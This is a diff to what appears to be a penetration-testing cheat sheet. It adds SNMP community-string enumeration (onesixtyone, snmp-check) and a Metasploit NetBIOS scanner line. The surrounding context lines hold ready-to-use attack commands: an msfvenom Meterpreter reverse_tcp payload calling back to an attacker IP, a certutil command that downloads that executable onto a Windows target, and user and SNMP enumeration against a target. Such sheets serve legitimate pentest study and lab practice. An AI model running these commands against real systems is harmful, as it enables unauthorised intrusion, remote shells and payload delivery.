@@ -108,6 +108,8 @@ while read -r user; do finger "$user"@$TARGET; done < usernames
 
 [*] (161) SNMP
 sudo nmap -sU -p161 --script "snmp* and not snmp-brute" $TARGET
+onesixtyone $TARGET -c STRING_WORDLIST
+snmp-check $TARGET -c VALID_STRING
 snmpwalk -v1 -c public $TARGET | grep 'STRING:'
 
 [*] (389) LDAP
@@ -462,6 +464,7 @@ msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=$MYIP LPORT=5555 -f exe -o
 powershell -c 'certutil -urlcache -f http://$MYIP:8088/msfshell.exe C:\programdata\msfshell.exe'
 
 cd \\users
+run auxiliary/scanner/netbios/nbname RHOSTS=10.10.10.0/24
 getuid
 getprivs
 sysinfo
